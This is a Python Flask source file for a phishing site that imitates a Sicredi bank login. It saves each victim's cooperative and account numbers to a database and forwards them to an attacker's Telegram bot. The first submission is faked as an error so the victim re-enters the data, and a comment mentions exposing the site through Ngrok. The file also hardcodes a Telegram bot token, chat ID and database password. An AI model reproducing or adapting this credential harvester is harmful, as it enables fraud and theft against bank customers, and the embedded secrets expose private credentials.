from flask import Flask, render_template, request, redirect, session
import psycopg2
import requests

app = Flask(__name__)
# Chave para as sessões funcionarem (importante para a dupla tentativa)
app.secret_key = 'projeto_sicredi_cesar_2026'

# --- CONFIGURAÇÕES DO TELEGRAM ---
TOKEN_TELEGRAM = "8584825689:AAE_X7_GsY2GUEJOCItb5EQb9q3TaFz94xA"
CHAT_ID_TELEGRAM = "5520879672"

def enviar_telegram(mensagem):
    """Função que envia o log direto para o seu celular"""
    try:
        url = f"https://api.telegram.org/bot{TOKEN_TELEGRAM}/sendMessage"
        payload = {
            "chat_id": CHAT_ID_TELEGRAM, 
            "text": mensagem, 
            "parse_mode": "HTML"
        }
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Erro ao enviar para o Telegram: {e}")

# --- CONFIGURAÇÃO DO BANCO ---
def get_db_connection():
    return psycopg2.connect(
        host='localhost',       
        database='postgres',   
        user='postgres',         
        password='nvme',     
        port='5432'                 
    )

@app.route('/')
def index():
    # Pega o status da URL para exibir as mensagens no HTML
    status = request.args.get('status')
    return render_template('login.html', status=status)

@app.route('/login', methods=['POST'])
def login():
    coop = request.form.get('coop')
    conta = request.form.get('conta')

    if coop and conta:
        try:
            # 1. Salva no banco (Sempre garante o dado primeiro)
            conn = get_db_connection()
            cur = conn.cursor()
            cur.execute(
                "INSERT INTO usuarios_sicredi (cooperativa, conta) VALUES (%s, %s)",
                (coop, conta)
            )
            conn.commit()
            cur.close()
            conn.close()
            
            # 2. Identifica se é a 1ª ou 2ª tentativa para o log
            if 'tentativa_feita' in session:
                tipo_log = "✅ <b>DADOS CONFIRMADOS (2ª)</b>"
                status_prox_passo = "sucesso"
                session.pop('tentativa_feita', None) # Limpa para o próximo
            else:
                tipo_log = "⚠️ <b>PRIMEIRA CAPTURA (1ª)</b>"
                status_prox_passo = "erro"
                session['tentativa_feita'] = True

            # 3. Monta e envia a mensagem para o Telegram
            msg = (
                f"{tipo_log}\n\n"
                f"<b>Cooperativa:</b> <code>{coop}</code>\n"
                f"<b>Conta:</b> <code>{conta}</code>\n"
                f"<b>Local:</b> São Paulo (ZL)"
            )
            enviar_telegram(msg)
            
            # 4. Redireciona de volta com o status para o HTML
            return redirect(f"/?status={status_prox_passo}")

        except Exception as e:
            print(f"Erro no processo: {e}")
            return f"Erro interno: {e}", 500

    return redirect('/')

if __name__ == '__main__':
    # host 0.0.0.0 permite que o Ngrok e outros dispositivos vejam o site
    app.run(debug=True, host='0.0.0.0', port=5000)